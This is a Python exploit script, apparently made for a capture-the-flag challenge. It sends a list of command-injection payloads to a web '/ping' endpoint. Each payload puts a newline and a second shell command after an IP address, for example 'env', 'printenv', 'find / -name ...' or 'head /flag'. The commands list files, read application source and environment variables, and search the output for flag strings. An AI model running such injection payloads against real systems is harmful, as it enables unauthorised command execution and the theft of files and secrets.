import requests
import urllib.parse
import json
import time

# Target URL
BASE_URL = "http://chall_citadel.cryptonitemit.in:32772"
PING_ENDPOINT = f"{BASE_URL}/ping"

def send_payload(payload):
    """Send a payload to the ping endpoint"""
    try:
        # URL encode the payload
        encoded_payload = urllib.parse.quote(payload)
        
        # Prepare the request
        headers = {
            'Content-Type': 'application/json',
        }
        data = {
            'target': encoded_payload
        }
        
        # Send POST request
        response = requests.post(PING_ENDPOINT, json=data, headers=headers, timeout=10)
        
        return response.json()
    except requests.exceptions.Timeout:
        return {'error': 'Request timed out'}
    except Exception as e:
        return {'error': str(e)}

def print_result(payload_name, payload, result):
    """Pretty print the results"""
    print("\n" + "="*80)
    print(f"PAYLOAD: {payload_name}")
    print(f"Command: {payload}")
    print("-"*80)
    
    if 'output' in result:
        print(result['output'])
    elif 'error' in result:
        print(f"ERROR: {result['error']}")
    else:
        print(json.dumps(result, indent=2))
    
    print("="*80)

def main():
   
    
    # Define payloads to test
    payloads = [
        # File discovery
        ("List all files recursively", "8.8.8.8\nfind . -type f"),
        ("List files with details", "8.8.8.8\nls -la"),
        ("Find flag files", "8.8.8.8\nfind . -name '*flag*'"),
        ("Find key files", "8.8.8.8\nfind . -name '*key*'"),
        ("Find blacksite files", "8.8.8.8\nfind . -name '*blacksite*'"),
        
        # Read files
        ("Read requirements.txt", "8.8.8.8\nhead requirements.txt"),
        ("Read full mission briefing", "8.8.8.8\nmore mission_briefing.txt"),
        ("Read full app.py", "8.8.8.8\nmore app.py"),
        
        # Search for keywords
        ("Search for 'flag' in files", "8.8.8.8\nfind . -type f -exec strings {} \\;"),
        ("Find text files", "8.8.8.8\nfind . -name '*.txt'"),
        
        # Check environment
        ("List environment variables", "8.8.8.8\nenv"),
        ("Print environment", "8.8.8.8\nprintenv"),
        
        # Check templates directory
        ("List templates directory", "8.8.8.8\nls -la templates"),
        ("Find files in templates", "8.8.8.8\nfind templates -type f"),
        
        # Read templates
        ("Read index.html", "8.8.8.8\nhead templates/index.html"),
        
        # Alternative reading methods
        ("Read with tail", "8.8.8.8\ntail -n 100 mission_briefing.txt"),
        ("Read with nl", "8.8.8.8\nnl mission_briefing.txt"),
        
        # Check root directory
        ("List root files", "8.8.8.8\nls -la /"),
        ("Find all txt files", "8.8.8.8\nfind / -name '*.txt' -type f 2>/dev/null"),
        
        # Check current directory thoroughly
        ("Show all hidden files", "8.8.8.8\nls -laR"),
        
        # Try to read potential flag locations
        ("Read /flag", "8.8.8.8\nhead /flag"),
        ("Read /flag.txt", "8.8.8.8\nhead /flag.txt"),
        ("Read flag.txt", "8.8.8.8\nhead flag.txt"),
        
        # Use awk to read files (alternative)
        ("Awk read mission_briefing", "8.8.8.8\nawk '{print}' mission_briefing.txt"),
        
        # Check for base64 encoded data
        ("Find base64 patterns", "8.8.8.8\nstrings mission_briefing.txt"),
        
        # Read all small files
        ("Read all txt files", "8.8.8.8\nfind . -name '*.txt' -exec head {} \\;"),
    ]
    
    # Execute each payload
    for i, (name, payload) in enumerate(payloads, 1):
        print(f"\n[{i}/{len(payloads)}] Testing: {name}")
        
        result = send_payload(payload)
        print_result(name, payload, result)
        
        # Check if we found something interesting
        if 'output' in result:
            output_lower = result['output'].lower()
            if any(keyword in output_lower for keyword in ['flag{', 'ctf{', 'blacksite', 'key:', 'aether{']):
                print("\n" + "!"*80)
                print("!!! POTENTIAL FLAG FOUND IN OUTPUT ABOVE !!!")
                print("!"*80)
        
        # Small delay to avoid overwhelming the server
        time.sleep(0.5)
    
    print("\n\n" + "="*80)
    print("Exploitation complete!")
    print("="*80)

if __name__ == "__main__":
    main()